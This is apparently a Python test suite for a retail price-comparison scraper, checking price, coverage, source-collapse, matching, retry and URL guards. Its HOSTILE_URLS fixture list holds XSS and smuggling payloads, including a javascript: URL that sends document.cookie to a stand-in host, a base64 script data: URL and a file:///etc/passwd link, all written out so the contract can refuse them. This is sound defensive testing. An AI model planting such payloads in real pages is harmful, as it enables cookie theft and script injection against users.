#!/usr/bin/env python3
"""Hostile tests: prove the price guards BITE on every adapter, one by one.

Why this file exists (DECISION-stopped.md, defect 2): the artifact contract has
asserted "no sentinel prices" since v1, and one chain still shipped 7 offers of
₡10.000.000 as real prices. The assertion was not broken — it simply never met
that value, because a guard only protects the sources that existed when it was
written.

So the test is per-adapter and negative: for EVERY adapter in retailers.ADAPTERS
and EVERY declared category, feed the pipeline an offer in that adapter's own
RawOffer shape carrying a hostile price, and assert the pipeline refuses it at
BOTH gates:

  gate 1  CategoryProfile.keeps()  — the scrape-time filter
  gate 2  export.assert_contract() — the publish-time contract

Gate 2 is checked by force-feeding a product past gate 1, because in that
incident gate 1 was exactly what did not fire. A guard that is only tested
through the happy path is not tested.

  python3 test_guards.py            -> prints one line per adapter x category

Zero network: nothing here fetches. It is pure parse/filter/assert.
"""
import json
import shutil
import sys
import tempfile
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

import export
import retailers
from catprofile import load_profiles
from export import ContractError

PROFILES = load_profiles()
BY_ID = {p.id: p for p in PROFILES}

# One offer per adapter, in that adapter's own shape, with a price that must
# never be published. Extend this list when an adapter is added — a new adapter
# with no row here fails `test_every_adapter_is_covered`.
HOSTILE_PRICES = [
    ("shipped_sentinel", 10_000_000), # the one that actually shipped
    ("legacy_sentinel", 999_999),
    ("legacy_sentinel_7", 9_999_999),
    ("absurd_unlisted", 88_000_000),  # a value no sentinel list knows about
]


def raw_offer(adapter, price, title):
    """A RawOffer as `adapter` would have produced it — same keys, same types."""
    return {
        "retailer_id": adapter.retailer_id,
        "retailer": adapter.display_name,
        "raw_title": title,
        "brand_hint": "SAMSUNG",
        "model_hint": "HOSTILE-001",
        "ean": None,
        "url": f"https://example.invalid/{adapter.id}/hostile",
        "image": None,
        "cash_price_crc": price,
        "list_price_crc": None,
        "in_stock": True,
        "credit": None,
        "sku": "HOSTILE-001",
        "fetched_at": "2026-08-04T00:00:00Z",
    }


# a title that PASSES each category's include filter, so the only thing that can
# reject the offer is the price — otherwise the test would pass for the wrong reason
TITLES = {
    "refrigeradoras": "REFRIGERADORA SAMSUNG SIDE BY SIDE 22 PIES",
    "pantallas": "PANTALLA SAMSUNG SMART TV 55 PULGADAS",
    "celulares": "CELULAR SAMSUNG GALAXY S25 ULTRA 512GB",
    "microondas": "MICROONDAS SAMSUNG 1.1 PIES ACERO INOXIDABLE",
    # Every category needs a line here or check_gate1 raises KeyError rather
    # than silently skipping it, which is the intended behaviour: a category
    # with no hostile fixture is a category whose price guards nobody has
    # proven. (A category once shipped without one, and because nothing
    # scheduled this file the loud failure had no reader for two days — the
    # same shape as the incident this file is about.) If a category is added,
    # add its fixture in the same commit.
}


def check_gate1():
    """Every adapter x category x hostile price must be dropped by keeps()."""
    fails, checked = [], 0
    for adapter in retailers.ADAPTERS:
        for profile in PROFILES:
            if adapter.id not in profile.sources:
                continue
            title = TITLES[profile.id]
            trusted = profile.trusts(adapter.id)
            # control: the same listing at a real price MUST be kept, or the
            # test proves nothing (a filter that drops everything "passes")
            if not profile.keeps(title, 500_000, trusted):
                fails.append(f"CONTROL {adapter.id}/{profile.id}: a real price was dropped")
            for label, price in HOSTILE_PRICES:
                checked += 1
                o = raw_offer(adapter, price, title)
                if profile.keeps(o["raw_title"], o["cash_price_crc"], trusted):
                    fails.append(f"gate1 {adapter.id}/{profile.id}/{label}: "
                                 f"{price} was KEPT")
    return checked, fails


# A fixture offer URL must be a REAL declared retailer host, because the contract
# now refuses anything else (security review H1). Before that guard existed these
# fixtures used `https://example.invalid/x`, and adding the assertion broke 11
# pre-existing controls at once — the guard was right and the fixtures were stale.
# Derived from db.RETAILERS so a new adapter needs no edit here.
_HOST_BY_NAME = {name: base for _, name, _, base, _ in __import__("db").RETAILERS}


CONTROL_RETAILER = retailers.ADAPTERS[0].display_name


def valid_url_for(retailer: str) -> str:
    """A publishable URL on `retailer`'s own declared host, or the first
    declared retailer's for a name the fixture invents."""
    base = _HOST_BY_NAME.get(retailer) or next(iter(_HOST_BY_NAME.values()))
    return f"{base.rstrip('/')}/fixture/x"


def _artifact(profile, price, retailer):
    """A products.json record that is valid in every way EXCEPT the price."""
    return [{
        "id": "hostile-001", "category": profile.id, "brand": "SAMSUNG",
        "model": "HOSTILE-001", "name": TITLES[profile.id],
        "image": None, "image_srcset": None,
        "attributes": {k: None for k in profile.attribute_keys},
        "offers": [{"retailer": retailer, "price_crc": price, "list_price_crc": None,
                    "in_stock": True, "url": valid_url_for(retailer),
                    "credit": None, "variant_count": 1, "variant_price_max_crc": None,
                    "scraped_at": "2026-08-04T00:00:00Z"}],
        "retailer_count": 1, "reviews": {"cr": None, "us": None},
        "us_reference": None, "markup_pct": None, "markup_basis": "pre_tax",
        "scraped_at": "2026-08-04T00:00:00Z",
        # Added 2026-08-29. `gap_band` joined PRODUCT_KEYS and this fixture was
        # not updated with it, so EVERY control in this file — the cases that
        # prove the guards do not refuse legitimate artifacts — had been failing
        # on a key mismatch rather than on what it meant to test. Combined with
        # the missing `parrillas` title above, this file has not produced a
        # meaningful PASS in some time. A fixture that drifts from the contract
        # tests the fixture.
        # a single-offer product has no spread, so band 0 (the `parejo`
        # near-tie floor) is the value the real exporter gives it.
        "gap_band": export.gap_band(0),
    }]


def check_gate2():
    """Force a hostile price PAST gate 1 into the artifacts and prove the
    contract still refuses to publish it — the shipped sentinel was precisely a
    hostile price that gate 1 did not catch."""
    fails, checked = [], 0
    for adapter in retailers.ADAPTERS:
        for profile in PROFILES:
            if adapter.id not in profile.sources:
                continue
            for label, price in HOSTILE_PRICES:
                checked += 1
                tmp = Path(tempfile.mkdtemp())
                try:
                    products = _artifact(profile, price, adapter.display_name)
                    _write_set(tmp, products, profile)
                    try:
                        export.assert_contract(tmp, PROFILES, tmp / "img")
                        fails.append(f"gate2 {adapter.id}/{profile.id}/{label}: "
                                     f"{price} PUBLISHED")
                    except ContractError:
                        pass                       # correct: refused
                finally:
                    shutil.rmtree(tmp, ignore_errors=True)
    return checked, fails


def check_gate2_control():
    """The same harness with a REAL price must PASS — otherwise check_gate2 is
    green because the fixture is broken, not because the guard works."""
    fails = []
    for profile in PROFILES:
        tmp = Path(tempfile.mkdtemp())
        try:
            products = _artifact(profile, max(profile.price_floor, 500_000), CONTROL_RETAILER)
            _write_set(tmp, products, profile)
            try:
                export.assert_contract(tmp, PROFILES, tmp / "img")
            except ContractError as e:
                fails.append(f"control {profile.id}: a valid artifact was refused — {e}")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
    return fails


def _write_set(out: Path, products, profile):
    w = lambda name, payload: (out / name).write_text(
        json.dumps(payload, ensure_ascii=False), encoding="utf-8")
    w("products.json", products)
    w("index.json", [export.index_record(p) for p in products])
    w("categories.json", [pr.to_json() for pr in PROFILES])
    w("branches.json", [])
    w("meta.json", {
        "fx_rate_crc_usd": 500.0, "fx_rate_date": "2026-08-04",
        "fx_source": "test", "generated_at": "2026-08-04T12:00:00Z",
        "category_counts": {profile.id: len(products)},
        "artifact_gzip_bytes": {}, "featured": [],
        "featured_policy": {"slots": 3}, "featured_dropped": [],
        "price_freshness": export.freshness(products, "2026-08-04T12:00:00Z"),
        "image_coverage": {"self_hosted": 0, "of_products": len(products),
                           "widths": [160, 320, 640]},
    })


def _imaged_set(out: Path, n_products: int, n_imaged: int, profile):
    """An artifact of `n_products` valid records, `n_imaged` of them carrying a
    real image path — and the derived WebP files on disk to back it, because the
    contract also asserts a product never points at a file that is not there."""
    img = out / "img"
    img.mkdir(parents=True, exist_ok=True)
    products = []
    for i in range(n_products):
        p = json.loads(json.dumps(_artifact(profile, 500_000, CONTROL_RETAILER)[0]))
        p["id"] = f"imaged-{i:04d}"
        if i < n_imaged:
            name = f"{i:012x}-320.webp"
            (img / name).write_bytes(b"\0" * 600)
            p["image"] = f"/img/{name}"
            p["image_srcset"] = f"/img/{name} 320w"
        products.append(p)
    _write_set(out, products, profile)
    meta = json.loads((out / "meta.json").read_text(encoding="utf-8"))
    meta["image_coverage"] = {"self_hosted": n_imaged, "of_products": n_products,
                              "widths": [160, 320, 640]}
    (out / "meta.json").write_text(json.dumps(meta, ensure_ascii=False), encoding="utf-8")
    return img


def check_image_coverage_regression():
    """The guard that was missing on 2026-08-04.

    Measured: an expansion run published 1,927 products with only 996 images —
    coverage fell from 100% to 51.7% — and the contract passed, because the only
    image assertion was `linked > 0`. A floor of one is not a regression guard,
    and the symptom (a page of brand-initial placeholders) is invisible to every
    other check in this file.

    Each case is (prev_products, prev_imaged, new_products, new_imaged, must_pass).
    The passing cases are the point: a guard that refuses growth is as broken as
    one that permits a collapse.
    """
    profile = PROFILES[0]
    cases = [
        # the measured regression, to scale: same catalogue, half the images
        (10, 10, 10, 5, False),
        # the earlier incident: total linkage collapse
        (10, 10, 10, 0, False),
        # an expansion that forgot to fetch images for the new retailers
        (10, 10, 20, 10, False),
        # a 10-point drop is not noise either
        (10, 10, 10, 9, False),
        # coverage held while the catalogue doubled — must publish
        (10, 10, 20, 20, True),
        # coverage improved — must publish
        (10, 5, 10, 9, True),
        # one image lost out of 100 is a retailer edit, not a regression
        (100, 100, 100, 99, True),
        # a catalogue that never had images cannot regress
        (10, 0, 20, 0, True),
    ]
    fails = []
    for prev_n, prev_img, new_n, new_img, must_pass in cases:
        root = Path(tempfile.mkdtemp())
        try:
            published, stage = root / "published", root / "published" / ".stage"
            _imaged_set(published, prev_n, prev_img, profile)
            img_dir = _imaged_set(stage, new_n, new_img, profile)
            label = (f"{prev_img}/{prev_n} -> {new_img}/{new_n}")
            try:
                export.assert_contract(stage, PROFILES, img_dir, published_dir=published)
                if not must_pass:
                    fails.append(f"coverage {label}: PUBLISHED a regression")
            except ContractError as e:
                if must_pass:
                    fails.append(f"coverage {label}: refused a legitimate artifact — {e}")
        finally:
            shutil.rmtree(root, ignore_errors=True)

    # no baseline at all (a first run) must publish, not deadlock
    root = Path(tempfile.mkdtemp())
    try:
        stage = root / ".stage"
        img_dir = _imaged_set(stage, 10, 0, profile)
        try:
            export.assert_contract(stage, PROFILES, img_dir, published_dir=root / "nope")
        except ContractError as e:
            fails.append(f"coverage first-run: refused with no baseline — {e}")
    finally:
        shutil.rmtree(root, ignore_errors=True)
    return len(cases) + 1, fails


def _retailer_set(out: Path, counts: dict, profile):
    """An artifact holding exactly `counts[retailer]` single-offer products.

    Every record is otherwise valid, so the ONLY thing under test is the
    per-retailer offer count against the baseline."""
    products = []
    for retailer, n in counts.items():
        for i in range(n):
            p = json.loads(json.dumps(_artifact(profile, 500_000, retailer)[0]))
            p["id"] = f"{retailer.lower().replace(' ', '-')}-{i:05d}"
            p["offers"][0]["url"] = valid_url_for(retailer) + f"?i={i}"
            products.append(p)
    _write_set(out, products, profile)
    return products


def _retailer_set_multi(out: Path, counts: dict, profiles):
    """Like `_retailer_set` but spread across several categories, so a scoped
    run can be compared against a wider baseline."""
    products = []
    for prof in profiles:
        for retailer, n in counts.items():
            for i in range(n):
                p = json.loads(json.dumps(_artifact(prof, 500_000, retailer)[0]))
                p["id"] = f"{prof.id}-{retailer.lower().replace(' ', '-')}-{i:05d}"
                p["offers"][0]["url"] = valid_url_for(retailer) + f"?i={i}"
                products.append(p)
    _write_set(out, products, profiles[0])
    return products


def check_source_collapse():
    """Follow-up #1 of the 2026-08-27 WAF-block incident, built 2026-08-29.

    `assert_contract` passed with an ENTIRE RETAILER AT ZERO, twice:

      2026-08-27  One retailer starts answering 403. Catalogue 3.991 -> 3.656.
      2026-08-28  A transient burst zeroes five retailers at once on
                  `lavadoras` in one run. Catalogue 3.991 -> 3.242 and 964 live
                  product URLs became 404s — for a fault that had fixed itself
                  by the next morning's run.

    THE PASSING CASES ARE THE POINT, and more so here than anywhere else in
    this file. This guard blocks the daily publish, so a false positive costs a
    day of the site being stale — and a guard that cries wolf gets its tolerance
    raised until it is decorative. Every "must publish" case below is a REAL
    day-over-day movement replayed from the committed artifacts of 2026-08-02 to
    2026-08-26 (18 transitions, 11 retailers): the largest ordinary drop ever
    observed is -10.5%, and every genuine incident is -100%. Nothing has
    ever landed in between, which is what makes 25% a measured threshold rather
    than a guessed one.

    Each case is (baseline_counts, new_counts, must_pass, label).
    """
    profile = PROFILES[0]
    T = "Pequena"
    cases = [
        # ---- must REFUSE -------------------------------------------------
        ({"Norte": 1248, "Sur": 420}, {"Norte": 694, "Sur": 420}, False,
         "the real 2026-08-28 collapse, -44%"),
        ({"Oeste": 486, "Sur": 420}, {"Sur": 420}, False,
         "the real 2026-08-27 WAF block, 486 -> 0"),
        ({"Este": 29, "Sur": 420}, {"Este": 0, "Sur": 420}, False,
         "a SMALL source going to zero — the size floor must not exempt it"),
        ({"Sur": 100, "Centro": 400}, {"Sur": 73, "Centro": 400}, False,
         "-27%, just past the tolerance"),
        # Costa SURVIVES here on purpose. The first draft zeroed both
        # sources and nothing else, which empties the catalogue — so a
        # different contract assertion fired first and this case passed
        # WITHOUT EVER REACHING THIS GUARD. Caught by re-running the file with
        # the guard neutered: 4 of 5 refusals flipped to failures and this one
        # did not, which is the only way that kind of false pass is visible.
        ({"Sur": 420, "Centro": 440, "Costa": 890},
         {"Sur": 0, "Centro": 0, "Costa": 890}, False,
         "two sources at once, the lavadoras shape"),
        # ---- must PUBLISH ------------------------------------------------
        ({"Sur": 448, "Centro": 450}, {"Sur": 401, "Centro": 450}, True,
         "-10.5%, the largest ordinary drop ever measured"),
        ({"Sur": 100, "Centro": 400}, {"Sur": 75, "Centro": 400}, True,
         "-25% exactly, AT the tolerance and not past it"),
        ({T: 13, "Sur": 420}, {T: 9, "Sur": 420}, True,
         "small-N noise: 13 -> 9 is -31% and means nothing"),
        ({"Sur": 420}, {"Sur": 900}, True,
         "a source that grew"),
        ({"Sur": 420}, {"Sur": 420, "Costa": 890}, True,
         "a NEW source appearing — no baseline, nothing to regress"),
        ({"Oeste": 0, "Sur": 420}, {"Sur": 420}, True,
         "already zero yesterday and zero today — must not deadlock forever"),
    ]
    fails = []
    for base, new, must_pass, label in cases:
        root = Path(tempfile.mkdtemp())
        try:
            published, stage = root / "published", root / "published" / ".stage"
            published.mkdir(parents=True, exist_ok=True)
            stage.mkdir(parents=True, exist_ok=True)
            _retailer_set(published, base, profile)
            _retailer_set(stage, new, profile)
            try:
                export.assert_contract(stage, PROFILES, None, published_dir=published)
                if not must_pass:
                    fails.append(f"source-collapse [{label}]: PUBLISHED a collapse")
            except ContractError as e:
                if must_pass:
                    fails.append(f"source-collapse [{label}]: refused a normal day — {e}")
        finally:
            shutil.rmtree(root, ignore_errors=True)

    # The override must actually override — otherwise a real, intended removal
    # (a retailer disabled on purpose) can never be published again.
    root = Path(tempfile.mkdtemp())
    try:
        published, stage = root / "published", root / "published" / ".stage"
        published.mkdir(parents=True, exist_ok=True)
        stage.mkdir(parents=True, exist_ok=True)
        _retailer_set(published, {"Norte": 1248, "Sur": 420}, profile)
        _retailer_set(stage, {"Norte": 694, "Sur": 420}, profile)
        try:
            export.assert_contract(stage, PROFILES, None, published_dir=published,
                                   allow_source_drop=True)
        except ContractError as e:
            fails.append(f"source-collapse [--allow-source-drop]: still refused — {e}")
    finally:
        shutil.rmtree(root, ignore_errors=True)

    # A first run has no baseline and must publish rather than deadlock.
    root = Path(tempfile.mkdtemp())
    try:
        stage = root / ".stage"
        stage.mkdir(parents=True, exist_ok=True)
        _retailer_set(stage, {"Sur": 420}, profile)
        try:
            export.assert_contract(stage, PROFILES, None, published_dir=root / "nope")
        except ContractError as e:
            fails.append(f"source-collapse [first run]: refused with no baseline — {e}")
    finally:
        shutil.rmtree(root, ignore_errors=True)

    # A SCOPED run (`--only <category>`) stages a subset, so every retailer in
    # the categories it did not touch reads as a total collapse. Measured on the
    # first end-to-end run of this guard: 10 retailers tripped at once on a
    # completely correct artifact. That bypass is tested here, because an
    # untested bypass is where a guard quietly stops applying.
    other = next((p for p in PROFILES if p.id != profile.id), None)
    if other is not None:
        root = Path(tempfile.mkdtemp())
        try:
            published, stage = root / "published", root / "published" / ".stage"
            published.mkdir(parents=True, exist_ok=True)
            stage.mkdir(parents=True, exist_ok=True)
            _retailer_set_multi(published, {"Sur": 420}, [profile, other])
            _retailer_set(stage, {"Sur": 420}, profile)      # one category only
            try:
                export.assert_contract(stage, PROFILES, None, published_dir=published)
            except ContractError as e:
                fails.append(f"source-collapse [scoped run]: refused a partial run — {e}")
        finally:
            shutil.rmtree(root, ignore_errors=True)
    return len(cases) + 3, fails


def check_transient_retry():
    """The 2026-08-28 root cause: a transient was indistinguishable from empty.

    Five independent retailers on four platforms all reported `0 scraped` for
    one category in one run and recovered by themselves the next morning. Every
    adapter reacts to a fetch failure with `break`/`continue`/`return []` — 21
    call sites — so one flaky response silently truncates a collection, and the
    run reports success.

    Two properties, and the SECOND ONE IS THE POINT:
      · a transient (429, 503, timeout, reset) is retried and can succeed;
      · a settled answer (403, 404) is NOT retried — one retailer has answered
        403 to every request since 2026-08-27 and retrying it three times per
        page would triple the load we put on a host that is already refusing
        us. A retry policy that cannot tell "try again" from "no" is impolite,
        not resilient.

    Zero network: `urlopen` is replaced with a scripted sequence.
    """
    import urllib.error
    import fetcher

    fails = []
    real_urlopen = urllib.request.urlopen
    real_backoff, real_cache = fetcher._BACKOFF_S, fetcher.CACHE_DIR
    tmp = Path(tempfile.mkdtemp())

    class _Resp:
        def __init__(self, body): self._b = body
        def read(self, n=-1): return self._b
        def __enter__(self): return self
        def __exit__(self, *a): return False

    def _http(code):
        return urllib.error.HTTPError("http://x/", code, "boom", {}, None)

    # (label, scripted outcomes, expect_ok, expect_attempts, expect_ledgered)
    #
    # THE 403-vs-404 PAIR IS THE INTERESTING ONE. Both are settled answers
    # and neither is retried, but only one is a FAILURE TO REACH THE SOURCE:
    #   403  the retailer is refusing us and may still stock the product
    #        -> ledger it, or that retailer's zero reads as a real catalogue
    #        change when it is a WAF block
    #   404  the product is gone, which is a real catalogue change and the
    #        correct answer to what we asked
    #        -> do NOT ledger it. One chain alone returns 3 in `smartwatches` from
    #        ordinary delisting, and ledgering those would put most retailers
    #        in `failed_hosts` every run — making the collapse guard excuse a
    #        genuine shrink as a network fault.
    cases = [
        ("503 then success",      [_http(503), b'{"ok":1}'],              True,  2, 0),
        ("429 twice then success",[_http(429), _http(429), b'{"ok":1}'],  True,  3, 0),
        ("timeout then success",  [TimeoutError("timed out"), b'{"ok":1}'], True, 2, 0),
        ("reset then success",    [ConnectionResetError("reset"), b'{"ok":1}'], True, 2, 0),
        ("503 forever",           [_http(503)] * 4,                        False, 3, 1),
        ("403 not retried, IS ledgered",  [_http(403)] * 4,                False, 1, 1),
        ("404 not retried, NOT ledgered", [_http(404)] * 4,                False, 1, 0),
        ("410 not retried, NOT ledgered", [_http(410)] * 4,                False, 1, 0),
    ]
    try:
        fetcher._BACKOFF_S = (0.0, 0.0)          # no real waiting in a test
        fetcher.CACHE_DIR = tmp
        fetcher.HOST_DELAY["retry.invalid"] = 0.0
        for i, (label, script, expect_ok, expect_attempts, expect_led) in enumerate(cases):
            fetcher.clear_failures()
            calls = {"n": 0}

            def fake(req, timeout=None, context=None, _s=script, _c=calls):
                _c["n"] += 1
                out = _s[_c["n"] - 1]
                if isinstance(out, Exception):
                    raise out
                return _Resp(out)

            urllib.request.urlopen = fake
            url = f"https://retry.invalid/p{i}"
            try:
                fetcher.fetch(url)
                ok = True
            except (fetcher.FetchError, OSError):
                # A non-transient status re-raises the original HTTPError (an
                # OSError subclass) rather than wrapping it, so the adapters'
                # existing `except (FetchError, OSError)` keeps working
                # unchanged. Both shapes are a failure to this test.
                ok = False
            if ok != expect_ok:
                fails.append(f"retry [{label}]: expected {'success' if expect_ok else 'failure'}")
            if calls["n"] != expect_attempts:
                fails.append(f"retry [{label}]: made {calls['n']} attempts, expected {expect_attempts}")
            led = len(fetcher.fetch_failures())
            if led != expect_led:
                fails.append(f"retry [{label}]: {led} ledger entries, expected "
                             f"{expect_led} — an unrecorded reachability failure is a "
                             f"silent zero, and a ledgered 404 is a real catalogue "
                             f"change disguised as a network fault")
    finally:
        urllib.request.urlopen = real_urlopen
        fetcher._BACKOFF_S, fetcher.CACHE_DIR = real_backoff, real_cache
        fetcher.HOST_DELAY.pop("retry.invalid", None)
        fetcher.clear_failures()
        shutil.rmtree(tmp, ignore_errors=True)
    return len(cases), fails


def check_spec_tokens_are_not_model_numbers():
    """`HDR10` shipped as a model number on 2026-08-04.

    Measured in the live artifact: `xiaomi-hdr10` carried a Xiaomi A Pro 43" QLED
    from one chain and an LG 65" UHD Serie 7300 from another as the SAME product, and
    rendered a 151% price gap — the top gap in the whole catalogue. `HDR10` has
    three letters and two digits, so `model_of` accepted it, and every title in
    the category contains it.

    The model blocklist is a denylist, which is the same shape as the assertion
    that let the ₡10.000.000 sentinel through: it only blocks tokens someone thought
    of. So the test is a list of spec tokens that must NEVER be a model, checked
    against every profile — and a control list of REAL model numbers that must
    still survive, because a blocklist that eats real models is worse than none.
    """
    from normalize import model_of, clean
    never = ["HDR10", "HDR10+", "QLED", "OLED", "NANOCELL", "MINILED", "UHD4K",
             "DOLBY", "ATMOS", "WEBOS", "TIZEN", "ANDROIDTV", "GOOGLETV"]
    # real model numbers seen in the artifact — these must keep working
    real = ["RF29DB965012AP", "8MWTWCO31WJB", "EME5025BSS0", "QN65Q7FAAPXPA",
            "75UT8000PSB", "FC0250LA", "MDRT87CCDLS-CA", "7MWED2140JB"]
    fails = []
    for profile in PROFILES:
        for tok in never:
            title = f"{TITLES[profile.id]} {tok}"
            got = model_of(clean(title), profile)
            if got == tok.replace("+", ""):
                fails.append(f"spec-token {profile.id}: {tok!r} accepted as a model")
        for tok in real:
            title = f"{TITLES[profile.id]} {tok}"
            got = model_of(clean(title), profile)
            if got is None:
                fails.append(f"CONTROL {profile.id}: real model {tok!r} was rejected")
    return len(PROFILES) * (len(never) + len(real)), fails


def check_tier1b_requires_brand_agreement():
    """Tier 1b auto-accepts at 0.99 on the model stem ALONE.

    Tier 2 folds brand into the fingerprint and Tier 3 explicitly requires
    `nb["brand"] == na["brand"]`. Tier 1b — the highest-confidence tier, and 95%
    of all accepted pairs — has no brand check at all. It rests on "a real
    manufacturer model number is globally unique", which holds until the
    extractor mistakes a spec token for one. Then two unrelated products merge
    and the app prints a verdict naming the wrong store.

    Two known brands under one stem is not a match this engine can defend, so it
    belongs in the review queue, not in `accepted`.
    """
    from match import run_matching
    profile = BY_ID["pantallas"]
    norte, sur = retailers.ADAPTERS[0], retailers.ADAPTERS[1]

    def offer(oid, adapter, title, model):
        o = raw_offer(adapter, 500_000, title)
        o["id"], o["model_hint"], o["brand_hint"] = oid, model, None
        return o

    fails, checked = [], 0

    # the measured false match: one stem, two brands, two retailers
    checked += 1
    offers = [
        offer(1, norte, 'PANTALLA XIAOMI A PRO 43 QLED UHD 4K HDR10 63977', None),
        offer(2, sur, 'PANTALLA LG 65 UHD 4K HDR10 PRO SERIE 7300', None),
    ]
    _, accepted, review = run_matching(offers, profile)
    if any(m == "tier1b_model_stem" for _, _, m, _, _ in accepted):
        fails.append("tier1b: XIAOMI and LG were auto-matched on a shared stem")

    # control: the SAME model number at two retailers, one brand — must match,
    # or the guard has bought precision by destroying the product
    checked += 1
    offers = [
        offer(1, norte, 'PANTALLA SAMSUNG SMART TV 55 PULGADAS QN55Q7FAAPXPA', None),
        offer(2, sur, 'PANTALLA SAMSUNG 55 QLED 4K QN55Q7FAAPXPA', None),
    ]
    _, accepted, _ = run_matching(offers, profile)
    if not any(m == "tier1b_model_stem" for _, _, m, _, _ in accepted):
        fails.append("CONTROL tier1b: one brand + one real model did NOT match")

    # control: a stem shared by one known brand and one UNKNOWN brand is still a
    # match — refusing it would drop every retailer that omits the brand
    checked += 1
    offers = [
        offer(1, norte, 'PANTALLA SAMSUNG SMART TV 55 PULGADAS QN55Q7FAAPXPA', None),
        offer(2, sur, 'PANTALLA SMART TV 55 PULGADAS QN55Q7FAAPXPA', None),
    ]
    _, accepted, _ = run_matching(offers, profile)
    if not any(m == "tier1b_model_stem" for _, _, m, _, _ in accepted):
        fails.append("CONTROL tier1b: known brand + unknown brand did NOT match")
    return checked, fails


def check_featured_requires_an_exact_match():
    """The featured slot renders an exact identifier or nothing.

    The slot ranks by gap, and a large gap is the SAME SIGNATURE as a false
    match: `xiaomi-hdr10` was the biggest gap in the catalogue at 151% because
    `HDR10` had become a model number and joined a 43" Xiaomi to a 65" LG. The
    live-price re-verification does not catch that — it re-checks the price,
    never whether the two offers are the same product.

    The controls matter more than the negative case here, because the cheap way
    to pass this test is to filter everything.
    """
    import featured
    def prod(pid, offer_ids, lo, hi):
        return {"id": pid, "_offer_ids": offer_ids,
                "offers": [{"retailer": "Tienda Norte", "price_crc": lo},
                           {"retailer": "Tienda Sur", "price_crc": hi}]}
    # a gap big enough to clear MIN_GAP_PCT and MIN_GAP_CRC on every product
    LO, HI = 1_000_000, 2_000_000
    products = [
        prod("exact-ean", [1, 2], LO, HI),
        prod("exact-stem", [3, 4], LO, HI),
        prod("fingerprint", [5, 6], LO, HI),
        prod("mixed", [7, 8, 9], LO, HI),
        prod("unjoined", [10], LO, HI),
    ]
    accepted = [
        ("refrigeradoras", 1, 2, "tier1a_ean", 1.00, "engine"),
        ("refrigeradoras", 3, 4, "tier1b_model_stem", 0.99, "engine"),
        ("refrigeradoras", 5, 6, "tier2_fingerprint_unambiguous", 0.75, "engine"),
        ("refrigeradoras", 7, 8, "tier1b_model_stem", 0.99, "engine"),
        ("refrigeradoras", 8, 9, "tier2_fingerprint_unambiguous", 0.75, "engine"),
    ]
    fails = []
    ids = featured.exact_match_ids(products, accepted)
    for pid, want in [("exact-ean", True), ("exact-stem", True),
                      ("fingerprint", False), ("mixed", False), ("unjoined", False)]:
        if (pid in ids) is not want:
            verb = "REJECTED" if want else "ACCEPTED"
            fails.append(f"featured floor: {pid} was {verb} — exact-only means "
                         f"EAN or model stem, and a mixed product is not defensible")

    got = {p["id"] for _, p in featured.candidates(products, exact_ids=ids)}
    if got != {"exact-ean", "exact-stem"}:
        fails.append(f"featured candidates with the floor returned {sorted(got)}, "
                     f"expected the two exact products")
    # CONTROL: the floor must be the only thing removing them. Without it, the
    # same fixture must yield all four multi-retailer products — otherwise this
    # test is green because the fixture never qualified in the first place.
    unfiltered = {p["id"] for _, p in featured.candidates(products)}
    if unfiltered != {"exact-ean", "exact-stem", "fingerprint", "mixed", "unjoined"}:
        fails.append(f"CONTROL featured: unfiltered returned {sorted(unfiltered)} — "
                     f"the fixture does not qualify on gap, so the floor is untested")
    # CONTROL: an empty accepted set must empty the slot rather than fall open.
    if featured.candidates(products, exact_ids=featured.exact_match_ids(products, [])):
        fails.append("CONTROL featured: no accepted pairs still produced candidates — "
                     "the floor fails OPEN, which is the one direction it must not")
    return 8, fails


# Offer URLs that must NEVER reach an href. Security review 2026-08-04 (H1): the
# scraped offer URL is rendered as `href={o.url}` in OfferTable and VerdictPlate
# and baked into 4,440 prerendered documents. React warns on a javascript: href
# in dev and renders it anyway in production, and `OFFER_KEYS` only insisted the
# field exist. The value comes from 8 retailers we do not control.
HOSTILE_URLS = [
    ("javascript", "javascript:fetch('https://evil.invalid?c='+document.cookie)"),
    ("javascript_case", "JaVaScRiPt:alert(1)"),
    ("data_html", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
    ("vbscript", "vbscript:msgbox(1)"),
    ("file", "file:///etc/passwd"),
    ("plain_http", "http://norte.example/p/x"),            # downgrade
    ("protocol_relative", "//evil.invalid/x"),
    ("wrong_host", "https://evil.invalid/producto/x"),
    ("lookalike_host", "https://norte.example.evil.invalid/x"),
    ("userinfo_smuggle", "https://norte.example@evil.invalid/x"),
    ("empty", ""),
    ("not_a_string", None),
]


def check_offer_urls_are_refused():
    """An offer URL becomes an href in a static document, so the contract must
    refuse anything that is not https on a declared retailer host.

    The CONTROLS carry this test: the allowlist is derived from db.RETAILERS, and
    production declares one retailer as `shop.tld` while every one of its real
    offer URLs is `www.shop.tld`. A literal allowlist would refuse all 81 of its
    offers, fail the contract, and the 06:00 unattended run would publish
    NOTHING. A security guard that causes a silent outage is worse than the hole
    it closes.
    """
    profile = PROFILES[0]
    fails, checked = [], 0

    def artifact_with_url(url):
        rec = json.loads(json.dumps(_artifact(profile, 500_000, CONTROL_RETAILER)[0]))
        rec["offers"][0]["url"] = url
        return [rec]

    for label, url in HOSTILE_URLS:
        checked += 1
        tmp = Path(tempfile.mkdtemp())
        try:
            _write_set(tmp, artifact_with_url(url), profile)
            try:
                export.assert_contract(tmp, PROFILES, tmp / "img")
                fails.append(f"offer-url {label}: {url!r} was PUBLISHED into an href")
            except ContractError:
                pass
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    # CONTROLS: every real retailer host must still publish, including the www
    # variants that db.RETAILERS does not literally declare.
    CONTROL_URLS = [
        ("norte_bare", "https://norte.example/p/x"),            # as declared
        ("norte_www", "https://www.norte.example/p/x"),         # www NOT in db
        ("sur_bare", "https://sur.example/p/x"),
        ("sur_www", "https://www.sur.example/p/x"),
    ]
    for label, url in CONTROL_URLS:
        checked += 1
        tmp = Path(tempfile.mkdtemp())
        try:
            _write_set(tmp, artifact_with_url(url), profile)
            try:
                export.assert_contract(tmp, PROFILES, tmp / "img")
            except ContractError as e:
                fails.append(f"CONTROL offer-url {label}: a REAL retailer url was "
                             f"refused — {url} — {e}")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
    return checked, fails


def check_every_adapter_is_covered():
    """The lesson from the sentinel incident, encoded: an adapter that no profile
    declares is an adapter no guard has been tested against."""
    undeclared = [a.id for a in retailers.ADAPTERS
                  if not any(a.id in p.sources for p in PROFILES)]
